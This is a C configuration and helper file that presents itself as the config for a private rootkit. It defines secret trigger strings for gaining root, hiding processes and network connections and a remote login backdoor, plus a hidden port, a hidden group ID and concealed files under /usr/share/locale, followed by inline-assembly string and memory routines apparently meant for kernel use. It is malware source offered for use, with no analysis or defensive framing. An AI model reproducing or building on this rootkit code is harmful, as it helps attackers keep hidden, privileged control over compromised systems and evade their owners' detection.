/* Small config 4 our private r00tkit */

/* functions call keywordz: */

#define GOTROOT      "(skfjnakj&asdadl:k"
#define HIDETSK      "adsa35t.&*888gsda_"
#define SHOWALL      "KKaksdbk37&i21scz-"
#define NETHIDE      "y23uhhIYSDGSbdnKJS"
#define R_LOGIN      "fjhjhkjhdas2537618"
#define CHECKME      "\x91\x35\x96\xcd\x80\xaf\x13"

#define LEN         8
#define MAX_TASKS   32

/* other settings: */

#define NETHIDE_TCP "/usr/share/locale/en/.tcp"
#define NETHIDE_UDP "/usr/share/locale/en/.udp"

#define NET_HIDENPORT "FE6A" /* port 65130 */
#define HIDEN_GID     0xfe6a
#define LEETMODE      6667


int	ma_itoa(char *buf, unsigned int n)
{
	unsigned int	nl = 0;
	unsigned int	d = 10000;
	unsigned char	*p = buf;

	if (!n) {
		*p++ = '0';
		goto out;
	}

	while (d) {
		unsigned char c;
		c = n / d;
		n = n % d;
		if (!c) {
			if (nl) *p++ = '0';
		} else {
			nl = 1;
			*p++ = c + '0';
		}
		d = d / 10;
	}
out:
	*p = 0;
	return ((unsigned long) p) - ((unsigned long) buf);
}



int    ma_atoi(char *n)
{
        register unsigned int ret = 0;
        while ((*n) >= '0' && (*n) <= '9')
                ret = ret * 10 + (*n++) - '0';
        return ret;
}

static inline int _strcmp(const char * cs,const char * ct)
{
int d0, d1;
register int __res;
__asm__ __volatile__(
	"1:\tlodsb\n\t"
	"scasb\n\t"
	"jne 2f\n\t"
	"testb %%al,%%al\n\t"
	"jne 1b\n\t"
	"xorl %%eax,%%eax\n\t"
	"jmp 3f\n"
	"2:\tsbbl %%eax,%%eax\n\t"
	"orb $1,%%al\n"
	"3:"
	:"=a" (__res), "=&S" (d0), "=&D" (d1)
		     :"1" (cs),"2" (ct));
return __res;
}

static inline int _strncmp(const char * cs,const char * ct,size_t count)
{
register int __res;
int d0, d1, d2;
__asm__ __volatile__(
	"1:\tdecl %3\n\t"
	"js 2f\n\t"
	"lodsb\n\t"
	"scasb\n\t"
	"jne 3f\n\t"
	"testb %%al,%%al\n\t"
	"jne 1b\n"
	"2:\txorl %%eax,%%eax\n\t"
	"jmp 4f\n"
	"3:\tsbbl %%eax,%%eax\n\t"
	"orb $1,%%al\n"
	"4:"
		     :"=a" (__res), "=&S" (d0), "=&D" (d1), "=&c" (d2)
		     :"1" (cs),"2" (ct),"3" (count));
return __res;
}

static inline size_t _strlen(const char * s)
{
int d0;
register int __res;
__asm__ __volatile__(
	"repne\n\t"
	"scasb\n\t"
	"notl %0\n\t"
	"decl %0"
	:"=c" (__res), "=&D" (d0) :"1" (s),"a" (0), "0" (0xffffffff));
return __res;
}

static inline void * _memcpy(void * to, const void * from, size_t n)
{
int d0, d1, d2;
__asm__ __volatile__(
	"rep ; movsl\n\t"
	"testb $2,%b4\n\t"
	"je 1f\n\t"
	"movsw\n"
	"1:\ttestb $1,%b4\n\t"
	"je 2f\n\t"
	"movsb\n"
	"2:"
	: "=&c" (d0), "=&D" (d1), "=&S" (d2)
	:"0" (n/4), "q" (n),"1" ((long) to),"2" ((long) from)
	: "memory");
return (to);
}

static inline void * _memset(void * s, char c,size_t count)
{
int d0, d1;
__asm__ __volatile__(
	"rep\n\t"
	"stosb"
	: "=&c" (d0), "=&D" (d1)
	:"a" (c),"1" (s),"0" (count)
	:"memory");
return s;
}

